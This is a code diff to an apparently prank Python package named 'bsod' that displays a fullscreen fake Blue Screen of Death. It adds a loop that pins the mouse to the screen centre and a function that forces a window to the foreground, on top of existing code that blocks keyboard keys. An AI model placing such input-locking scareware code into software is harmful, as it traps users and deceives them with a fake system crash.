@@ -1,7 +1,11 @@
 import sys
+import time
 import pygame
 import keyboard
+import pyautogui
 import pkg_resources
+import win32gui, win32con
+
 
 def path_convertor(path):
     return pkg_resources.resource_filename('bsod', path)
@@ -9,6 +13,23 @@ def path_convertor(path):
 def block_keyboard():
     for i in range(150):
         keyboard.block_key(i)
+
+def block_mouse():
+        screen_width, screen_height = pyautogui.size()
+        disable_gesture_position = (screen_width // 2, screen_height // 2)
+
+        while True:
+            pyautogui.moveTo(disable_gesture_position)
+            time.sleep(1)
+
+def bring_window_to_top(window_title):
+    hwnd = win32gui.FindWindow(None, window_title)
+
+    if hwnd:
+        win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
+        win32gui.SetForegroundWindow(hwnd)
+    else:
+        print(f"Window with title '{window_title}' not found.")
 
 def show_error():
     pygame.init()
@@ -23,7 +44,7 @@ def show_error():
     image = pygame.image.load(image_path)
     image_width, image_height = image.get_size()
 
-    screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)
+    screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN | pygame.SWSURFACE)
     screen_width, screen_height = pygame.display.get_surface().get_size()
 
     scale_factor = min(screen_width / image_width, screen_height / image_height)
